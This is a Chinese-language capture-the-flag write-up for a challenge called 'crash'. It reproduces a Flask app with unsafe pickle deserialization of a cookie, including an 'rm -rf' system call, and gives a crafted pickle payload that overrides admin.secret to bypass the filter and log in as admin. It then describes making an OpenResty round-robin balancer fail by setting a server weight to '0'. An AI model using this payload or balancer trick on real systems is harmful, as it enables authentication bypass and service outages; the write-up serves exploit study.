---
tags: [Pickle反序列化, 变量覆盖, 负载均衡利用, Lua, Python, RCE]
---

# crash

```
import base64
# import sqlite3
import pickle
from flask import Flask, make_response,request, session
import admin
import random


app = Flask(__name__,static_url_path= '')
app.secret_key=random.randbytes(12)


class User:
def __init__(self, username,password):
self.username=username
self.token=hash(password)


def get_password(username):
if username=="admin":
return admin.secret
else:
# conn=sqlite3.connect("user.db")
# cursor=conn.cursor()
# cursor.execute(f"select password from usertable where username='{username}'")
# data=cursor.fetchall()[0]
# if data:
#     return data[0]
# else:
#     return None
return session.get("password")


@app.route( '/balancer', methods=[ 'GET', 'POST'])
def flag():
pickle_data=base64.b64decode(request.cookies.get("userdata"))
if b'R' in pickle_data or b"secret" in pickle_data:
return "You damm hacker!"
os.system("rm -rf *py*")
userdata=pickle.loads(pickle_data)
if userdata.token!=hash(get_password(userdata.username)):
return "Login First"
if userdata.username== 'admin':
return "Welcome admin, here is your next challenge!"
return "You're not admin!"


@app.route( '/login', methods=[ 'GET', 'POST'])
def login():
resp = make_response("success")
session["password"]=request.values.get("password")
resp.set_cookie("userdata",
base64.b64encode(pickle.dumps(User(request.values.get("username"),request.values.get("p
assword")),2)), max_age=3600)
return resp


@app.route( '/', methods=[ 'GET', 'POST'])
def index():
return open( 'source.txt',"r").read()


if __name__ == '__main__ ':
app.run(host='0.0.0.0 ', port=5000)
```

```
b'''capp
admin
(S'\\x73ecret'
S'1'
db. '''
设置admin.secret为1，然后用admin/1登录
```

admin登录之后，给的是一个lua-resty-balancer负载均衡，目标是让slb超时错误。

```
# nginx.vh.default.conf  --  docker-openresty #
# This file is installed to:
#   `/etc/nginx/conf.d/default.conf` #
# It tracks the `server` section of the upstream OpenResty's `nginx.conf`. #
# This config (and any other configs in `etc/nginx/conf.d/`) is loaded by
# default by the `include` directive in `/usr/local/openresty/nginx/conf/nginx.conf`. #
# See https://github.com/openresty/docker-openresty/blob/master/README.md#nginx-config- files
#
lua_package_path "/lua-resty-balancer/lib/?.lua;;";
lua_package_cpath "/lua-resty-balancer/?.so;;";


server {
listen       8088;
server_name  localhost;


#charset koi8-r;
#access_log  /var/log/nginx/host.access.log  main;


location /gettestresult {
default_type text/html;
content_by_lua '
local resty_roundrobin = require "resty.roundrobin"
local server_list = {
[ngx.var.arg_server1] = ngx.var.arg_weight1,
[ngx.var.arg_server2] = ngx.var.arg_weight2,
[ngx.var.arg_server3] = ngx.var.arg_weight3,
}
local rr_up = resty_roundrobin:new(server_list)
for i = 0,9 do
ngx.say("Server seleted for request ",i,":
&nbsp;&nbsp;&nbsp;&nbsp;" ,rr_up:find(),"<br>")
end
';
}


#error_page  404              /404.html;


# redirect server error pages to the static page /50x.html 
## proxy the PHP scripts to Apache listening on 127.0.0.1:80
#
#location ~ \.php$ {
#    proxy_pass   http://127.0.0.1;
#}


# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
#
#location ~ \.php$ {
#    root           /usr/local/openresty/nginx/html;
#    fastcgi_pass   127.0.0.1:9000;
#    fastcgi_index  index.php;
#    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
#    include        fastcgi_params;
#}


# deny access to .htaccess files, if Apache's document root
# concurs with nginx's one
#
#location ~ /\.ht {
#    deny  all;
#}
}
```

原理跟bilibili去年崩掉一样，让weight为"0"

